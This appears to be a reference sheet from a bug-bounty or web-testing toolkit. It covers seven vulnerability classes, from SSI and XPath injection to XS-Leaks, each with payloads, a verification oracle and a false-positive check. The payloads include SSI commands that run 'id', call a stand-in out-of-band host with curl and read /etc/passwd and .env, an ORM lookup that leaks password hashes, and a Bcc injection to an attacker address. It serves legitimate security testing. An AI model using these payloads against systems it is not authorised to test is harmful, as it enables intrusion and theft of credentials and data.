# Unauthenticated niche classes — SSI, XPath, client-side path traversal, ORM leak, email-header injection, insecure randomness, XS-Leak

> Zero-login classes that fall between the mainstream categories. Each entry: where it lives,
> a payload, the deterministic oracle, and the false-positive gate. LEAD until the oracle fires.

## 1. SSI Injection (Server-Side Includes)
- **Where:** pages served by nginx/Apache with `ssi on` — `.shtml/.shtm/.stm`, legacy includes; reflected values rendered inside an SSI-enabled response.
- **Payloads:** `<!--#exec cmd="id"-->`, `<!--#exec cmd="curl http://<oob>/x"-->`, `<!--#include virtual="/etc/passwd"-->`, `<!--#include file=".env"-->`.
- **Oracle:** command output/`uid=` OR file content appears in the response; blind → OOB callback (`/oob`).
- **FP gate:** literal `<!--#...-->` echoed unprocessed = no SSI; only a 500 with no output = parser error, not execution.

## 2. XPath Injection
- **Where:** XML-backed login/search (`/login`, `/search?user=`), SAML/SOAP query builders.
- **Payloads:** `' or '1'='1`, `' or count(/*)=1 or '1'='2`, `admin' or 1=1 or ''='`, boolean/time via `count()`/`substring()`.
- **Oracle:** auth bypass (different response for a wrong password) OR boolean/time differential that flips only on injected logic.
- **FP gate:** response identical for true/false payloads = not injectable; parameterized XPath = safe.

## 3. Client-Side Path Traversal (CSPT)
- **Where:** SPA code that builds API URLs from user input — `fetch('/api/users/'+id)`, `history.pushState`, route params, `import()`/redirects.
- **Payloads:** `..%2f..%2fadmin`, path-encoded `%2e%2e`, `/%2e%2e%2f`, double-encoded; drive the client to request an unintended API path.
- **Oracle:** the app issues a request to a path the user should not reach (e.g., admin endpoint) → server-side effect / privilege boundary crossed.
- **FP gate:** purely client-side normalization with no server effect = no finding; needs a server state change or cross-boundary read.

## 4. ORM Leak (Django-style operator injection)
- **Where:** Django/Rails ORMs that accept query params as filters, e.g. `?field__startswith=`, `?field__regex=`, `?id__in=`.
- **Payloads:** `?email__startswith=a`, `?password__startswith=...`, `?user__password__regex=^pbkdf2`, nested `__` lookups.
- **Oracle:** differential response (row count / 500 vs 200) reveals field values char-by-char; correlation across chars reconstructs data.
- **FP gate:** identical response for all operator payloads = not injectable; explicit field allow-list = safe.

## 5. Email Header Injection (CRLF via SMTP)
- **Where:** contact/subscribe/invite/reset forms whose `email`/`name` reaches an SMTP header; `%0d%0a` injection.
- **Payloads:** `victim@x.com%0d%0aBcc:attacker@x`, `%0aCc:...`, `%0d%0aSubject:`; also `\n` in the display name.
- **Oracle:** injected header honored (Bcc delivered / Subject changed) OR OOB email to attacker; verify via a controlled inbox.
- **FP gate:** parser strips/rejects CRLF (no second header) = safe; header just URL-encoded in the body = not injection.

## 6. Insecure Randomness
- **Where:** tokens from `Math.random()`, timestamps, `rand()`, sequential/PID-based IDs — reset tokens, invites, OTPs, share/export links.
- **Payloads/DET:** collect N tokens (same user/flow), test for time-seeded/Python-`random`/JS-`Math.random` correlation; predict the next token.
- **Oracle:** predicted token accepted OR two tokens collide; deterministic reproduction of another token.
- **FP gate:** tokens are CSPRNG (`secrets`/`crypto.getRandomValues`), high entropy, single-use+expiring = safe.

## 7. XS-Leak (cross-site leaks)
- **Where:** cross-origin state inferable via timing, error events, cache probing, frame counting — "is the victim logged in / has object X".
- **Techniques:** `onload`/`onerror` frame/script probes, cache-timing (`no-store` vs cached), `window.length` (frame count), CORB/COEP behavior, redirect timing.
- **Oracle:** measurable, repeatable cross-origin difference (timing/error/cache) that reveals private user state; must survive repeat trials and control.
- **FP gate:** state not private, `Cache-Control: no-store` + COOP/COEP block the probe, or difference within jitter noise = no finding.

## Routing
These map to `hunt-misc` / `hunt-api-misconfig` / `hunt-xss` (CSPT) / `web2-exposure` (ORM leak via error). Add a deterministic verifier only if the class recurs on real targets; until then, LEAD + manual oracle above.